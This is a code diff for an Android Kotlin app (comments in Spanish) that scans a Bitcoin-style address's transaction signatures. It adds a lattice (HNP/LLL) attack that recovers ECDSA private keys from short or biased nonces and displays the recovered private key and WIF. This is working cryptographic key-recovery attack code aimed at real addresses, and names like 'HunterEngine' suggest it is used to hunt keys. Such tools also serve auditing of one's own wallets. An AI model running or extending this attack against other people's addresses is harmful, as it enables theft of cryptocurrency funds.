@@ -1439,6 +1439,7 @@ class PubkeyToolsActivity : Activity() {
     @Volatile private var nonceCorriendo = false
     private class FirmaRS(val pub: String, val r: String, val s: String, val htype: Int)
     private class RegFirma(val tx: org.json.JSONObject, val vin: Int, val s: String, val htype: Int)
+    private class SigReg(val r: String, val s: String, val tx: org.json.JSONObject, val vin: Int, val htype: Int)
 
     private fun hexABytes(h: String): ByteArray? {
         if (h.length % 2 != 0) return null
@@ -1501,6 +1502,7 @@ class PubkeyToolsActivity : Activity() {
             salida.removeAllViews(); nonceCorriendo = true; btn.text = "Stop"; tvEstado.text = "Fetching transactions…"
             Thread {
                 val visto = HashMap<String, HashMap<String, RegFirma>>()
+                val porPub = HashMap<String, ArrayList<SigReg>>()   // para el ataque de retícula
                 val reusos = ArrayList<Array<String?>>()
                 val yaVisto = HashSet<String>()
                 var firmas = 0; var txs = 0; var ultimo = ""; var paginas = 0; var red = true
@@ -1518,6 +1520,8 @@ class PubkeyToolsActivity : Activity() {
                         for (vi in 0 until vins.length()) {
                             val f = firmaDe(vins.optJSONObject(vi) ?: continue) ?: continue
                             firmas++
+                            if (porPub.values.sumOf { it.size } < 60)
+                                porPub.getOrPut(f.pub) { ArrayList() }.add(SigReg(f.r, f.s, tx, vi, f.htype))
                             val m = visto.getOrPut(f.pub) { HashMap() }
                             val previo = m[f.r]
                             if (previo == null) m[f.r] = RegFirma(tx, vi, f.s, f.htype)
@@ -1534,8 +1538,46 @@ class PubkeyToolsActivity : Activity() {
                     if (arr.length() < 25) break@bucle
                 }
                 val fin = txs; val sigs = firmas
+                // Si no hubo clave recuperada por reutilización, probar el ataque de
+                // retícula (nonces cortos/sesgados) sobre la pubkey con más firmas.
+                var latPriv: String? = null; var latPub: String? = null
+                val recuperadas = reusos.count { it[4] != null }
+                if (red && recuperadas == 0 && nonceCorriendo) {
+                    val best = porPub.maxByOrNull { it.value.size }
+                    if (best != null && best.value.size >= 3) {
+                        runOnUiThread { tvEstado.text = "No reuse — trying lattice on short nonces…" }
+                        val target = normalizaPubComprimida(best.key)
+                        val tri = ArrayList<Triple<java.math.BigInteger, java.math.BigInteger, java.math.BigInteger>>()
+                        for (sr in best.value.take(10)) {   // pocas firmas bastan para nonces cortos; mantiene la retícula pequeña
+                            if (!nonceCorriendo) break
+                            val z = FirmaTx.z(sr.tx, sr.vin, sr.htype) ?: continue
+                            try { tri.add(Triple(java.math.BigInteger(sr.r, 16), java.math.BigInteger(sr.s, 16), java.math.BigInteger(z, 16))) } catch (e: Throwable) {}
+                        }
+                        if (target != null && tri.size >= 3) {
+                            for (bb in intArrayOf(128, 176, 220)) {
+                                if (!nonceCorriendo) break
+                                val d = try { Lattice.recover(tri, bb) { cand ->
+                                    val pv = cand.toString(16).padStart(64, '0')
+                                    (try { HunterEngine.pubDeHex(pv) } catch (e: Throwable) { "" }).equals(target, ignoreCase = true)
+                                } } catch (e: Throwable) { null }
+                                if (d != null) { latPriv = d.toString(16).padStart(64, '0'); latPub = best.key; break }
+                            }
+                        }
+                    }
+                }
                 runOnUiThread {
                     nonceCorriendo = false; btn.text = "Scan signatures"
+                    if (latPriv != null) {
+                        val wif = try { HunterEngine.wifDeHex(latPriv!!).substringBefore("|") } catch (e: Throwable) { "" }
+                        tvEstado.text = "⚠ Weak nonces (lattice) · $fin tx · $sigs sig · key recovered"
+                        salida.addView(filaResultado("RECOVERED PRIVATE KEY (lattice)",
+                            "priv $latPriv" + (if (wif.isNotEmpty()) "\nWIF  $wif" else "") + "\npubkey ${latPub?.take(16)}…", true))
+                        salida.addView(TextView(this).apply {
+                            text = "The signatures used short/biased nonces (HNP + LLL). This address is compromised — move any funds."
+                            textSize = AppTheme.SP_CAPTION; setTextColor(AppTheme.WARN)
+                            typeface = AppTheme.body(context); setLineSpacing(0f, 1.35f); setPadding(dp(2), dp(10), 0, 0) })
+                        return@runOnUiThread
+                    }
                     when {
                         !red -> tvEstado.text = "No network, or address not found / never spent."
                         reusos.isNotEmpty() -> {
@@ -1555,7 +1597,7 @@ class PubkeyToolsActivity : Activity() {
                                 textSize = AppTheme.SP_CAPTION; setTextColor(AppTheme.WARN)
                                 typeface = AppTheme.body(context); setLineSpacing(0f, 1.35f); setPadding(dp(2), dp(10), 0, 0) })
                         }
-                        else -> tvEstado.text = "Clean · $fin tx · $sigs signatures · no nonce reuse"
+                        else -> tvEstado.text = "Clean · $fin tx · $sigs signatures · no reuse, no weak nonces"
                     }
                 }
             }.apply { isDaemon = true; start() }
